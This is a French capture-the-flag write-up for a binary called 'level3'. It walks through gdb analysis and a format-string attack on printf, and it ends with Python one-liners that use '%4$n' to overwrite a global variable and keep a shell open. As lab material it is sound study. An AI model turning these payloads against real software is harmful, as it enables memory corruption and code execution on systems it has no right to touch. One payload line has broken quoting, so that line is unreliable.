# Level3

On a un main qui ne fait pas grand chose a part call la fonction `v()`

On a encore un call a gets qui va surement nous servir pour faire un BoF

Mettons un break point dans `v()` apres le gets
Analysons les informations que nous avons

On a un seved eip : `0x8048525`

```
(gdb) x/i 0x8048525
   0x8048525 <main+11>: leave
```

On a eax qui pointe vers `0xbffff520` (notre chaine)
```
x/s 0xbffff520
0xbffff520:      "\n"
```

Ensuite notre buf est envoye a printf
`0x804988c`

`0x080484da <+54>:    mov    0x804988c,%eax`
                                
A quoi correspond `0x804988c` ?

```
(gdb) x/x 0x804988c
0x804988c <m>:  0x00000000
```

On voit un `<m>` qui apparait ici que je n'avais jamais vu avant
En cherchant un peu, j'ai vu que cette adresse etait dans la partie .bss du programme

`0804988c  uint32_t m = 0x0`

Variable gloable ?
Exploit printf ?

On passe en argument à notre programme des formateurs. Le programme se retrouve donc à exécuter
la chose suivante :
   printf("%x%x%x%x");
Seulement vous on remarque que la fonction printf() n'a pas d'arguments pour remplacer les formateurs dans la chaine.
Elle affiche donc ce qu'elle a sous la main, c'est à dire les valeurs présentes sur la pile.

Types de formateurs

Formateurs directs (comme %x) : Affichent directement la valeur ciblée sur la pile

Formateurs pointeurs (comme %s) : Affichent la valeur située à l'adresse ciblée

Formateur spécial %n : Écrit en mémoire le nombre de caractères affichés avant lui

Mécanisme d'exploitation
Fonctionnement

La fonction printf() parcourt la pile 4 octets par 4 octets pour trouver les valeurs à afficher

Sans arguments, printf() affiche les valeurs présentes sur la pile
Le formateur %n permet d'écrire en mémoire à une adresse spécifique
Technique d'exploitation

   Utilisation de %hn pour écrire 2 octets à la fois

Possibilité de contrôler le flux d'exécution en écrasant l'adresse de retour (EIP)
Utilisation de la notation %Nd pour générer des padding de taille contrôlée

Impact
Cette vulnérabilité permet notamment :

La lecture de données sensibles en mémoire
L'écriture à des adresses arbitraires
L'exécution de code arbitraire via la redirection du flux d'exécution


python -c "print '\x8c\x98\x04\x08' + ' + '%4$n'"

Le symbole $ dans %4$n est un paramètre de position qui permet d'accéder directement au 4ème argument sur la pile 

0xbffff520 adresse du buf

x/x 0xbffff520
0xbffff520:     0x0804988c --> CORRESPOND A NOTRE GLOBALE :D

Plus qu'a modifier sa valeur

"AAAA + "%x %x %x %x %x"

printf exploit --> 
r < <(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
(python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"'; cat) | ./level3
(python -c 'print "\x8c\x98\x04\x08" + "%60c" + "%4$n"'; cat) | ./level3
(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
